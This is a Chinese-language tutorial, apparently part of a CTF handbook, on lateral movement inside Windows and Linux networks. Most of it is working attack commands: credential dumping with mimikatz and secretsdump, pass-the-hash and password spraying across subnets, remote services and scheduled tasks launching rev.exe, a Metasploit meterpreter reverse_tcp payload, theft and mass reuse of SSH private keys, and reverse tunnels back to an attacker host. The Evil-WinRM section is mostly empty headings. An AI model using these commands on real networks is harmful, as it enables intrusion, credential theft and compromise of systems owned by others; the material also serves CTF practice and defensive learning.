# 内网横向移动

## 1. 概述

横向移动（Lateral Movement）是内网渗透的核心环节。在CTF Attack-Defense模式中，拿到一台内网主机的权限后，需要通过横向移动渗透到更多内网主机。本节覆盖PsExec、WMI、SMBExec、哈希传递（Pass-the-Hash, PtH）、票据传递（Pass-the-Ticket, PtT）、WinRM、SSH横向等多种技术，以及内网代理与隧道搭建。

## 2. 核心原理

### 2.1 横向移动的底层机制

```
Windows横向移动依赖的服务/协议：

1. SMB (445/TCP) - Server Message Block
   ├── ADMIN$ 共享 (C:\Windows)
   ├── C$ 共享 (C:\)
   └── IPC$ 共享 (进程间通信)

2. WMI (135/TCP + 动态端口) - Windows Management Instrumentation
   └── 远程创建进程 (Win32_Process.Create)

3. WinRM (5985/TCP HTTP, 5986/TCP HTTPS)
   └── PowerShell Remoting (Enter-PSSession)

4. RDP (3389/TCP) - Remote Desktop Protocol
   └── 图形界面远程控制

5. DCOM (135/TCP + 动态端口)
   └── MMC20.Application, ShellWindows, Excel.Application

6. SSH (Linux/Unix 22/TCP)
   └── 密钥/密码横向
```

### 2.2 认证机制

```
Windows横向移动身份验证依赖：

1. NTLM认证
   ├── 交互式登录 (密码明文)
   ├── 网络登录 (NTLM Challenge-Response)
   └── 哈希传递 (Pass-the-Hash - 仅NTLM Hash，无需明文密码)

2. Kerberos认证 (域环境)
   ├── 密码登录 → TGT获取
   ├── 票据传递 (Pass-the-Ticket)
   ├── 白银票据 (Silver Ticket)
   └── 黄金票据 (Golden Ticket)

3. 本地账户 vs 域账户
   ├── .\Administrator  (本地SAM账户)
   └── DOMAIN\Administrator (域账户)
```

## 3. 横向移动工具与命令

### 3.1 Impacket工具集（Linux攻击机）

Impacket是Python实现的Windows协议工具集，是CTF和渗透测试中最常用的横向移动工具包。

```bash
# 安装
sudo apt install python3-impacket
# 或从源码: 
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket && pip3 install .

# === psexec.py — SMB远程执行（类似Sysinternals PsExec） ===
# 密码登录
psexec.py DOMAIN/username:password@10.10.10.5
psexec.py WORKGROUP/Administrator:Password123@10.10.10.5 cmd.exe

# Pass-the-Hash
psexec.py -hashes :<NTLM_HASH> DOMAIN/Administrator@10.10.10.5
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 \
          DOMAIN/Administrator@10.10.10.5

# 执行单条命令
psexec.py DOMAIN/user:pass@10.10.10.5 "whoami && ipconfig"

# === wmiexec.py — WMI远程执行 ===
# WMI方式执行，日志记录较少
wmiexec.py DOMAIN/Administrator:Password123@10.10.10.5
wmiexec.py -hashes :<NTLM_HASH> DOMAIN/Administrator@10.10.10.5

# === smbexec.py — SMB远程执行 ===
# 通过创建服务执行命令（与psexec类似）
smbexec.py DOMAIN/Administrator:Password123@10.10.10.5
smbexec.py -hashes :<NTLM_HASH> DOMAIN/Administrator@10.10.10.5

# === atexec.py — 计划任务远程执行 ===
# 通过ATSVC创建计划任务（不需要SMB写权限）
atexec.py DOMAIN/Administrator:Password123@10.10.10.5 "whoami"
atexec.py -hashes :<NTLM_HASH> DOMAIN/Administrator@10.10.10.5 "cmd.exe /c whoami"

# === dcomexec.py — DCOM远程执行 ===
# 使用DCOM对象的多种执行方法
dcomexec.py DOMAIN/Administrator:Password123@10.10.10.5
dcomexec.py -hashes :<NTLM_HASH> -object ShellWindows DOMAIN/Administrator@10.10.10.5

# === secretsdump.py — 远程凭证转储 ===
# 从远程主机dump SAM/SECRETS/LSA
secretsdump.py DOMAIN/Administrator:Password123@10.10.10.5
secretsdump.py -hashes :<NTLM_HASH> DOMAIN/Administrator@10.10.10.5

# === reg.py — 远程注册表操作 ===
# 读取/写入远程注册表
reg.py DOMAIN/Administrator:Password123@10.10.10.5 query -keyName HKLM\\SOFTWARE\\Microsoft
reg.py DOMAIN/Administrator:Password123@10.10.10.5 add -keyName HKLM\\SOFTWARE\\Test -v TestValue -vt REG_SZ -vd data

# === samrdump.py — SAM远程枚举 ===
samrdump.py DOMAIN/Administrator:Password123@10.10.10.5

# === services.py — 远程服务管理 ===
services.py DOMAIN/Administrator:Password123@10.10.10.5 list
services.py DOMAIN/Administrator:Password123@10.10.10.5 create -name TestSvc -display "Test" -path "C:\Temp\rev.exe"
services.py DOMAIN/Administrator:Password123@10.10.10.5 start -name TestSvc

# === lookupsid.py — SID枚举 ===
lookupsid.py DOMAIN/guest:password@10.10.10.5
# 可以枚举所有域用户（即使只有低权限）

# === getTGT.py — Kerberos TGT获取 ===
getTGT.py DOMAIN/user:password -dc-ip 10.10.10.10
# 保存到环境变量或ccache文件

# === getST.py — Kerberos 服务票据获取 ===
getST.py -spn cifs/target-host.domain.com -dc-ip 10.10.10.10 DOMAIN/user:password

# 使用kerberos票据
export KRB5CCNAME=/path/to/ccache
wmiexec.py -k -no-pass DOMAIN/user@target-host.domain.com
```

**Impacket横向移动工具对比：**

| 工具 | 原理 | 需要权限 | 日志痕迹 | 适用场景 |
|------|------|---------|---------|---------|
| psexec.py | SMB+服务 | Admin$可写 | 大量(服务+exe) | 标准横向 |
| wmiexec.py | WMI | 管理员 | 中等 | 半交互式Shell |
| smbexec.py | SMB+服务 | 管理员 | 大量 | 命令执行 |
| atexec.py | 计划任务 | 管理员 | 中等 | 单条命令 |
| dcomexec.py | DCOM | 管理员 | 较少 | WMI被监控时 |
| evil-winrm | WinRM | WinRM用户 | 中等 | 交互式PowerShell |

### 3.2 哈希传递 (Pass-the-Hash, PtH)

哈希传递是Windows横向移动中最强大也是最常用的技术——攻击者不需要知道明文密码，只需要NTLM哈希即可通过Windows网络认证。

```bash
# === NTLM哈希格式 ===
# LM Hash:NTLM Hash
# aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
# 上例中LM Hash是空值的占位符，实际使用的是NTLM Hash部分

# === 从CrackMapExec进行PtH ===
# 验证哈希是否有效
crackmapexec smb 10.10.10.5 -u Administrator -H "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
# 返回 (Pwn3d!) → 哈希有效且有管理员权限

# 执行命令
crackmapexec smb 10.10.10.5 -u Administrator -H <NTLM_HASH> -x "whoami"
crackmapexec smb 10.10.10.0/24 -u Administrator -H <NTLM_HASH> --local-auth
crackmapexec smb 10.10.10.0/24 -u Administrator -H <NTLM_HASH> -M lsassy  # 执行模块

# === CME密码喷射和哈希爆破 ===
crackmapexec smb targets.txt -u users.txt -p passwords.txt
crackmapexec smb targets.txt -u users.txt -H hashes.txt
crackmapexec smb 10.10.10.0/24 -u Administrator -H <HASH> --continue-on-success

# === Mimikatz PtH ===
# 在Windows目标上
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:<HASH> /run:cmd.exe" exit
# 这会打开一个cmd窗口，使用Administrator的身份
# 在这个新窗口中可以访问远程资源

# === xfreerdp PtH (RDP连接) ===
# 需要目标启用了Restricted Admin模式
xfreerdp /u:Administrator /pth:<NTLM_HASH> /v:10.10.10.5
# 或者在RDP设置中启用Restricted Admin Mode

# === 批量PtH验证 ===
#!/bin/bash
# hashtest.sh
HASH=$1
SUBNET="10.0.0.0/24"

crackmapexec smb $SUBNET -u Administrator -H "$HASH" --local-auth \
    | grep "Pwn3d!" | awk '{print $2}' > pwned_hosts.txt
crackmapexec smb $SUBNET -u Administrator -H "$HASH" \
    | grep "Pwn3d!" | awk '{print $2}' > pwned_domain.txt

echo "[+] Local admin: $(wc -l < pwned_hosts.txt) hosts"
echo "[+] Domain admin: $(wc -l < pwned_domain.txt) hosts"
```

### 3.3 Evil-WinRM — PowerShell远程管理

```bash

gem install evil-winrm

# 使用脚本/模块

# 在会话中: script_name.ps1

# AMSI绕过 + 执行脚本

# Bypass-4MSI用法
```

### 3.5 PowerShell远程执行

```powershell
# === WinRM/PSRemoting ===
# 交互式会话
Enter-PSSession -ComputerName 10.10.10.5 -Credential DOMAIN\Administrator

# 创建凭据对象
$secpass = ConvertTo-SecureString 'Password123' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('DOMAIN\Administrator', $secpass)

Enter-PSSession -ComputerName 10.10.10.5 -Credential $cred

# 执行单条命令
Invoke-Command -ComputerName 10.10.10.5 -Credential $cred -ScriptBlock { whoami; hostname }
Invoke-Command -ComputerName 10.10.10.5 -Credential $cred -FilePath C:\Temp\script.ps1

# 批量执行（多台机器）
Invoke-Command -ComputerName (Get-Content targets.txt) -Credential $cred -ScriptBlock { whoami }

# 复制文件
Copy-Item -ToSession $session -Path local_file -Destination remote_path

# 使用SSL
$option = New-PSSessionOption -SkipCACheck
$session = New-PSSession -ComputerName 10.10.10.5 -Credential $cred -UseSSL -SessionOption $option

# === WMI ===
# PowerShell调用WMI
$cred = Get-Credential
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "notepad.exe" -ComputerName 10.10.10.5 -Credential $cred

# === 计划任务 ===
# 通过schtasks远程创建
schtasks /create /s 10.10.10.5 /u DOMAIN\Administrator /p Password123 \
    /tn "RemoteTask" /tr "C:\Temp\rev.exe" /sc once /st 00:00
schtasks /run /s 10.10.10.5 /u DOMAIN\Administrator /p Password123 /tn "RemoteTask"
```

## 4. 内网代理与隧道

### 4.1 Chisel (快速隧道)

```bash
# === Chisel — SOCKS/端口转发 ===
# 服务端(攻击机)
./chisel server -p 8000 --reverse

# 客户端(目标机)
./chisel client 10.10.10.100:8000 R:socks
# 在攻击机创建 socks5://127.0.0.1:1080

# 或指定SOCKS端口
./chisel client 10.10.10.100:8000 R:1080:socks

# 反向端口转发
# 将攻击机的4444转发到内网目标的3389
./chisel client 10.10.10.100:8000 R:4444:internal_host:3389

# 远程端口转发（将内网服务暴露到攻击机）
./chisel client 10.10.10.100:8000 R:3306:internal_db:3306
```

### 4.2 SSH隧道

```bash
# SSH跳板机 → 内网

# 本地端口转发 (攻击机 → SSH跳板 → 内网目标)
# 将内网host:80映射到攻击机localhost:8080
ssh -L 8080:internal_host:80 -N -f user@jump_host

# 远程端口转发 (内网目标 → SSH跳板 → 攻击机)
# 在SSH跳板机上执行，将目标机22端口暴露到攻击机2222
ssh -R 2222:localhost:22 -N -f user@attacker_ip

# 动态端口转发 (SOCKS代理)
ssh -D 1080 -N -f user@jump_host
# 配置proxychains使用此SOCKS代理

# SSH跳板链（多级代理）
ssh -J user1@jump1:22,user2@jump2:2222 user3@target
```

### 4.3 Proxychains（SOCKS代理链）

```bash
# 配置 /etc/proxychains4.conf
# [ProxyList]
# socks5 127.0.0.1 1080
# socks5 127.0.0.1 1081  # 二级代理

# 使用
proxychains4 nmap -sT -Pn -p 22,80,443,445,3389 192.168.1.0/24
proxychains4 crackmapexec smb 192.168.1.5 -u Administrator -p Password123
proxychains4 impacket-psexec DOMAIN/Administrator:Password123@192.168.1.5

# 注意：proxychains仅支持TCP，且nmap必须用-sT（全连接扫描）
# 不能用SYN扫描(-sS)，因为SOCKS代理不支持原始套接字
```

### 4.4 Metasploit内网路由

```ruby
# 在msfconsole中
# 1. 获得一个内网主机的Meterpreter会话

# 2. 添加路由（从攻击机网关到内网段）
route add 192.168.1.0 255.255.255.0 1
# session 1通过此路由可达的内网

route print

# 3. 使用SOCKS代理服务器模块
use auxiliary/server/socks_proxy
set VERSION 5
set SRVHOST 0.0.0.0
set SRVPORT 1080
run
# 现在外部工具可以通过 socks5://127.0.0.1:1080 访问内网

# 4. 或者使用Metasploit内部模块扫描内网
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 22,80,443,445,3389,8080
run

# 5. 通过路由进行SMB攻击
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.5
set SMBUser Administrator
set SMBPass Password123
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.10.100
set LPORT 4445
run
```

## 5. 实战示例

### 5.1 完整横向移动链

**场景：** 已获得一台Windows Server 2019 (10.10.10.5)的Administrator权限，通过Mimikatz获得了域管理员哈希，需要横向移动到内网所有Windows主机并收集Flag。

```bash
# === 阶段1: 凭证收集 ===
# 在初始目标10.10.10.5上
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
# 提取到:
# DOMAIN\Administrator : NTLM: fc525c9683e8fe0672baa197cd1b525a
# 以及多个其他用户

# secretsdump.py远程dump
secretsdump.py DOMAIN/Administrator@10.10.10.5 -just-dc-ntlm

# === 阶段2: 凭证验证与内网发现 ===
# 对哈希做本地管理员验证
crackmapexec smb 10.10.10.0/24 -u Administrator \
    -H fc525c9683e8fe0672baa197cd1b525a --local-auth

# 结果:
# SMB  10.10.10.5  445  DC01     [*] Windows 10.0 Build 17763 x64
# SMB  10.10.10.5  445  DC01     [+] WORKGROUP\Administrator fc525c9683e8fe... (Pwn3d!)
# SMB  10.10.10.10 445  WEB01     [+] WORKGROUP\Administrator fc525c9683e8fe... (Pwn3d!)
# SMB  10.10.10.15 445  DB01      [-] WORKGROUP\Administrator fc525c9683e8fe...
# 发现10.10.10.10也有相同本地管理员哈希

# === 阶段3: 横向移动到WEB01 (10.10.10.10) ===
# 方法A: wmiexec.py PtH
wmiexec.py -hashes :fc525c9683e8fe0672baa197cd1b525a \
    Administrator@10.10.10.10
C:\> whoami
# nt authority\system
C:\> type C:\Users\Administrator\Desktop\flag.txt
# CTF{Lateral_Move_Web01}

# 方法B: psexec.py (获取交互式shell)
psexec.py -hashes :fc525c9683e8fe0672baa197cd1b525a \
    Administrator@10.10.10.10 cmd.exe

# === 阶段4: 从WEB01进一步dump凭证 ===
# 通过wmiexec上传mimikatz
# 在wmiexec会话中
smbclient //10.10.10.10/C$ -U Administrator --hash=fc525c9683e8fe0672baa197cd1b525a
put mimikatz.exe Windows/Temp/m.exe
del Windows/Temp/m.exe  # 执行后尽快清理

# 或者直接远程dump（推荐，不落地文件）
secretsdump.py -hashes :fc525c9683e8fe0672baa197cd1b525a \
    Administrator@10.10.10.10

# === 阶段5: 批量横向移动收集所有Flag ===
# 创建内网目标列表
seq 1 254 | xargs -I{} echo "10.10.10.{}" > full_net.txt

# 批量PtH测试
crackmapexec smb full_net.txt -u Administrator \
    -H fc525c9683e8fe0672baa197cd1b525a --local-auth \
```

### 5.2 SSH横向移动（Linux内网）

```bash
# 场景：获得Linux主机10.10.10.5的root权限，内网还有多台Linux服务器

# 1. 收集SSH密钥
cat ~/.ssh/id_rsa
cat /root/.ssh/id_rsa
cat /home/*/.ssh/id_rsa 2>/dev/null
# 发现密钥: /root/.ssh/id_rsa

# 2. 扫描内网SSH
for ip in $(seq 1 254); do
    timeout 1 bash -c "echo >/dev/tcp/192.168.1.$ip/22" 2>/dev/null && \
        echo "192.168.1.$ip SSH OPEN"
done > ssh_targets.txt

# 3. 使用密钥横向
while read -r target; do
    for user in root admin ubuntu centos; do
        ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
            -i /root/.ssh/id_rsa $user@$target "hostname; whoami; cat /root/flag.txt 2>/dev/null; cat /home/*/flag.txt 2>/dev/null" &
    done
done < ssh_targets.txt
wait

# 4. SSH跳板建立SOCKS代理进入更深层内网
# 使用10.10.10.5作为跳板进入192.168.2.0/24
ssh -D 1080 -N -f root@10.10.10.5
proxychains4 nmap -sT -Pn 192.168.2.0/24
```

## 6. 常见误区与注意事项

- **误区1：只尝试psexec。** 不同横向移动工具使用不同的底层协议，某些可能被AV/EDR阻止，需要尝试多种。
- **误区2：过度横向移动触发警报。** 在内网中大量快速的psexec/WMI操作会触发Windows事件日志（EID 4624/4625/7045），在A/D模式中可能触发防守方注意。
- **误区3：本地管理员哈希混用域管理员。** .\Administrator和DOMAIN\Administrator是完全不同的账户。`--local-auth`标志用于本地认证。
- **误区4：忽略Linux横向移动。** 内网中常见Linux服务器（Web/DB/Cache），SSH密钥和密码复用同样重要。
- **注意：NTLM中继攻击在内网中也非常有效（Responder+ntlmrelayx）。**
- **注意：hash传递只在NTLM认证体系有效，Kerberos需要票据传递。**

## 7. 相关知识点

- **NTLM中继攻击：** Responder + ntlmrelayx (MultiRelay)
- **Kerberos攻击：** AS-REP Roasting, Kerberoasting, Golden/Silver Ticket
- **BloodHound内网分析：** 可视化攻击路径，找出最短的域管理员路径
- **SCShell:** 无文件横向移动技术（通过服务控制管理器）
- **SharpMove:** C#实现的多种横向移动方法
- **Windows事件日志取证视角：** 了解哪些操作产生什么日志(EID)
